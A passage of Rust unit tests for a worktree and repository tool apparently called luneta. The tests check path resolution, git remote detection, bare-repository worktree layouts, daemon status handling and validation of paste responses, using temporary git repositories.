        std::os::unix::fs::symlink(scratch.join("repo/docs/plan.md"), scratch.join("notes/l.md"))
            .unwrap();
        let file = |text: &str, from: Option<&str>| {
            File::parse(text, from.map(directory)).unwrap()
        };

        let inside = path("repo/docs/plan.md");
        assert_eq!(file(&inside, None).real().as_ref(), Ok(&inside));
        assert_eq!(file("docs/plan.md", Some(&repo)).real().as_ref(), Ok(&inside));
        let root = scratch.to_str();
        assert_eq!(file("notes/l.md", root).real().as_ref(), Ok(&inside));
        let gone = file(&path("repo/gone.md"), None).real();
        assert_eq!(gone, Err("no such file".to_owned()));
        assert_eq!(file(&path("notes/dir.md"), None).real(), Err("it is no file".to_owned()));
        assert_eq!(
            file("docs/plan.md", None).real(),
            Err("its path is relative, and the row highlighted works in no directory to go from"
                .to_owned())
        );

        let own = file(&inside, Some(&row)).repository(&inside);
        assert_eq!(own, Ok(path("repo/docs")));
        let outside = path("notes/plan.md");
        let by_row = file(&outside, Some(&row)).repository(&outside);
        assert_eq!(by_row, Ok(row.clone()));
        assert_eq!(
            file(&outside, None).repository(&outside),
            Err("it is in no repository, and the row highlighted works in no directory to go by"
                .to_owned())
        );
        assert_eq!(
            file(&outside, Some(&notes)).repository(&outside),
            Err(format!("it is in no repository, nor is {notes}, the row highlighted"))
        );

        let refused = path("refused");
        assert!(git(&scratch, &["init", "-q", "-b", "main", &refused]).is_some());
        assert!(git(&refused, &["config", "core.repositoryformatversion", "99"]).is_some());
        fs::write(scratch.join("refused/plan.md"), "plan").unwrap();
        let in_it = path("refused/plan.md");
        let unsaid = file(&in_it, Some(&row)).repository(&in_it).unwrap_err();
        let git_said = "git did not say what repository it is in: fatal: ";
        assert!(unsaid.starts_with(git_said), "{unsaid}");
        let by_it = file(&outside, Some(&refused)).repository(&outside).unwrap_err();
        let by_it_starts =
            format!("it is in no repository, and git did not say what {refused}, the row");
        assert!(by_it.starts_with(&by_it_starts), "{by_it}");
    }

    fn ended(code: i32, stdout: &[u8], stderr: &[u8]) -> Ran {
        Ran::Ended {
            status: ExitStatus::from_raw(code << 8),
            stdout: stdout.to_vec(),
            stderr: stderr.to_vec(),
        }
    }

    #[test]
    fn a_worktree_may_be_made_unless_luneta_worktree_said_why_it_failed() {
        let failed = format!("{WHY}it is not there\n");
        let failed = worktree_said(ended(1, b"", failed.as_bytes()));
        assert_eq!(failed, Err(Unready::Failed("it is not there".to_owned())));
        let killed = Ran::Ended {
            status: ExitStatus::from_raw(9),
            stdout: Vec::new(),
            stderr: Vec::new(),
        };
        let unsure = [
            Ran::Stuck,
            killed,
            ended(101, b"", b""),
            ended(0, b"", b""),
            ended(0, b"/no/dir\n", b""),
        ];
        for unsure in unsure {
            let said = worktree_said(unsure);
            assert!(matches!(said, Err(Unready::InDoubt(_))), "{said:?}");
        }
    }

    #[test]
    fn git_says_a_directory_has_no_remotes_apart_from_saying_nothing() {
        let scratch = tempfile::tempdir().unwrap();
        let dir = |name: &str| scratch.path().join(name);
        let remotes = |name: &str| remotes_in(dir(name).to_str().unwrap());
        let repository = |name: &str| {
            assert!(git(scratch.path(), &["init", "-q", name]).is_some());
            dir(name)
        };
        let url = "git@github.com:o/n.git";
        assert!(git(repository("with"), &["remote", "add", "origin", url]).is_some());
        let listed = format!("remote.origin.url {url}\n");
        assert_eq!(remotes("with"), Remotes::Listed(listed));

        repository("without");
        fs::create_dir(dir("plain")).unwrap();
        for name in ["without", "plain", "gone"] {
            assert_eq!(remotes(name), Remotes::Unlisted, "{name}");
        }

        let newer = repository("newer");
        assert!(git(newer, &["config", "core.repositoryformatversion", "9"]).is_some());
        let config = repository("broken").join(".git/config");
        fs::write(&config, fs::read_to_string(&config).unwrap() + "[broken\n").unwrap();
        for name in ["newer", "broken"] {
            assert!(matches!(remotes(name), Remotes::Unsaid(_)), "{name}: {:?}", remotes(name));
        }

        let stale = b"fatal: cannot change to '/mnt/w': Stale file handle\n";
        let stale = Remotes::of(Ok(ended(128, b"", stale)));
        assert!(matches!(stale, Remotes::Unsaid(_)), "{stale:?}");
        let stuck = Remotes::Unsaid("it did not answer in time".to_owned());
        assert_eq!(Remotes::of(Ok(Ran::Stuck)), stuck);
        let unrun = Remotes::of(Err(io::Error::from(io::ErrorKind::NotFound)));
        assert!(matches!(unrun, Remotes::Unsaid(_)), "{unrun:?}");
    }

    #[test]
    fn only_a_daemon_that_says_it_made_nothing_lets_another_machine_go_on() {
        let on: Destination = "nixos".parse().unwrap();
        let why = || "nixos: why".to_owned();
        assert_eq!(Unready::of(&on, &Status::not_found("why")), Unready::Nowhere(why()));
        for status in [Status::failed_precondition("why"), Status::invalid_argument("why")] {
            assert_eq!(Unready::of(&on, &status), Unready::Failed(why()), "{status:?}");
        }
        let older = Unready::of(&on, &Status::unimplemented("why"));
        assert!(matches!(older, Unready::Failed(_)), "{older:?}");
        let unsure = [
            Status::aborted("why"),
            Status::unavailable("why"),
            Status::cancelled("why"),
            Status::deadline_exceeded("why"),
            Status::internal("why"),
            Status::unknown("why"),
        ];
        for status in unsure {
            assert_eq!(Unready::of(&on, &status), Unready::InDoubt(why()), "{status:?}");
        }
    }

    #[test]
    fn where_a_key_goes_is_answered_as_it_was_found() {
        let asked_of_link = Pasted::new(Work::Link(issue()), Vec::new());
        let plan = File::parse("plan.md", None).unwrap();
        let asked_of_file = Pasted::new(Work::File(plan), Vec::new());
        let of_link = || Readied::Link(issue());
        let of_file = || Readied::File { real: "/w/cdk/main/plan.md".to_owned() };
        for at in [At::There(1), At::Unopened] {
            let folder = directory("/w/cdk/issue-2736");
            let branch = Some("issue-2736".to_owned());
            let ready = Ready { at, folder, branch, moved_off: false, work: of_link() };
            assert_eq!(asked_of_link.answered(ready.clone().answer()), Ok(ready.clone()));
            let ready = Ready { work: of_file(), ..ready };
            assert_eq!(asked_of_file.answered(ready.clone().answer()), Ok(ready));
        }
        let there = |work| Ready {
            at: At::There(1),
            folder: directory("/w/x"),
            branch: None,
            moved_off: false,
            work,
        };
        let answer = || there(of_link()).answer();
        let refused = |answer: PasteResponse| asked_of_link.answered(answer).unwrap_err();
        let relative = PasteResponse { folder: "x".to_owned(), ..answer() };
        assert_eq!(refused(relative), "folder: \"x\" is no absolute path");
        let refused_of_file = |answer: PasteResponse| asked_of_file.answered(answer).unwrap_err();
        let relative = PasteResponse { file: Some("plan.md".to_owned()), ..answer() };
        assert_eq!(refused_of_file(relative), "file: \"plan.md\" is no absolute path");
        assert_eq!(refused_of_file(answer()), "it does not say where the file is");
        assert_eq!(
            refused(there(of_file()).answer()),
            "file: \"/w/cdk/main/plan.md\" is of no link"
        );
        assert!(refused(PasteResponse { at: None, ..answer() }).contains("a newer lunetad does"));
    }

    #[test]
    fn an_answer_that_does_not_say_the_worktree_is_at_the_head_is_refused() {
        let asked = Pasted::new(Work::Link(link()), Vec::new()).wanting(Wanted::AtHead);
        let at = At::There(0);
        let (folder, branch, work) = (directory("/w/x"), None, Readied::Link(link()));
        let ready = Ready { at, folder, branch, moved_off: false, work };
        let synced = PasteResponse { at_head: true, ..ready.clone().answer() };
        assert_eq!(asked.answered(synced), Ok(ready.clone()));
        let why = asked.answered(ready.clone().answer()).unwrap_err();
        assert!(why.contains("too old to sync"), "{why}");
        let unasked = Pasted::new(Work::Link(link()), Vec::new());
        assert_eq!(unasked.answered(ready.clone().answer()), Ok(ready));
    }

    #[test]
    fn only_a_pull_request_s_link_can_be_asked_at_its_head() {
        let at_head = |work: Work| Pasted::new(work, Vec::new()).wanting(Wanted::AtHead).asked(None);
        let (on, pasted) = Pasted::of(at_head(Work::Link(link()))).unwrap();
        assert_eq!(on, None);
        assert_eq!(pasted.wanted, Wanted::AtHead);
        let plan = File::parse("/w/plan.md", None).unwrap();
        for work in [Work::Link(issue()), Work::File(plan)] {
            let why = Pasted::of(at_head(work)).unwrap_err();
            assert_eq!(why, "at_head: only a pull request has a head");
        }
    }

    #[test]
    fn luneta_makes_worktrees_only_from_a_worktree_of_a_bare_where_wt_makes_them_too() {
        let scratch = tempfile::tempdir().unwrap();
        let scratch = fs::canonicalize(scratch.path()).unwrap();
        let worked = |bare: &Path, at: &Path| {
            let (bare, at) = (bare.to_str().unwrap(), at.to_str().unwrap());
            assert!(git(&scratch, &["init", "-q", "--bare", bare]).is_some());
            assert!(git(bare, &["worktree", "add", "-q", "--orphan", "-b", "main", at]).is_some());
            at.to_owned()
        };
        let bare = scratch.join("cdk/.bare");
        let main = worked(&bare, &scratch.join("cdk/main"));
        let found = Repo::discover(Some(Path::new(&main))).unwrap();
        let wt = found.container().unwrap().join("issue-7");
        let root = Dir::parse(scratch.join("cdk").to_str().unwrap()).unwrap();
        assert_eq!(layout(&main), Layout::Wt(root.clone()));
        assert_eq!(wt_made(&main), Ok(root.clone()));
        assert_eq!(lands(&root, &Holders::default()), Ok(()));
        assert_eq!(Some(wt_makes(&root, "issue-7").as_str()), wt.to_str());
        let bare = bare.to_str().unwrap();
        assert_eq!(layout(bare), Layout::InBare);
        let alone = format!("{bare} is in a bare repository, not in a worktree of it");
        assert_eq!(wt_made(bare), Err(format!("{alone}; {READ_BY_WORKTREES}")));
        for (name, itself) in [("infra/.git", Layout::BareElsewhere), ("cdk.git", Layout::InBare)] {
            let elsewhere = scratch.join(name);
            let main = worked(&elsewhere, &scratch.join(format!("{name}-main")));
            let found = Repo::discover(Some(Path::new(&main))).unwrap();
            assert!(found.container().is_ok(), "wt makes worktrees in {name}");
            assert_eq!(layout(&main), Layout::BareElsewhere);
            assert_eq!(layout(elsewhere.to_str().unwrap()), itself, "{name} itself");
        }
        let unkept = scratch.join("lun\teta");
        let main = worked(&unkept.join(".bare"), &unkept.join("main"));
        let why = format!("{:?}: a path holds a control character", unkept.to_str().unwrap());
        assert_eq!(layout(&main), Layout::WtRefused(why.clone()));
        assert_eq!(
            wt_made(&main),
            Err(format!("{main} is in a clone wt made in a folder luneta cannot keep: {why}"))
        );
        let plain = scratch.join("plain");
        assert!(git(&scratch, &["init", "-q", plain.to_str().unwrap()]).is_some());
        assert_eq!(layout(plain.to_str().unwrap()), Layout::Git);
        let (sep, worked) = (scratch.join("sep/.bare"), scratch.join("sep/main"));
        let sep = format!("--separate-git-dir={}", sep.display());
        assert!(git(&scratch, &["init", "-q", &sep, worked.to_str().unwrap()]).is_some());
        let found = Repo::discover(Some(worked.as_path())).unwrap();
        assert!(found.container().is_err(), "wt makes no worktree beside a .bare with a work tree");
        assert_eq!(layout(worked.to_str().unwrap()), Layout::Git);
    }

    #[test]
    fn a_note_names_the_branch_a_worktree_moved_off_and_the_one_it_is_on() {
        let file = Work::File(File::parse("/w/sync-rework.md", None).unwrap());
        let of = |work: &Work, on| work.off_branch(on);
        let note = "on dev-docs, not issue-2736";
        assert_eq!(of(&Work::Link(issue()), Some("dev-docs")).as_deref(), Some(note));
        let note = "on no branch, not issue-2736";
        assert_eq!(of(&Work::Link(issue()), None).as_deref(), Some(note));
        let note = "on feat, not md-sync-rework";
        assert_eq!(of(&file, Some("feat")).as_deref(), Some(note));
        assert_eq!(of(&Work::Link(link()), Some("feat")), None);
    }

    #[test]
    fn a_place_names_the_view_luneta_said_of_it() {
        fn ready<P>(at: At<P>) -> Ready<P> {
            let work = Readied::File { real: "/w/plan.md".to_owned() };
            Ready { at, folder: directory("/w"), branch: None, moved_off: false, work }
        }
        let views = ["dots:1", "cdk:4"];
        assert_eq!(ready(At::There(1)).placed(&views), Ok(ready(At::There("cdk:4"))));
        assert_eq!(ready(At::There(2)).placed(&views), Err(2));
        assert_eq!(ready(At::Unopened).placed(&views), Ok(ready(At::Unopened)));
    }
}
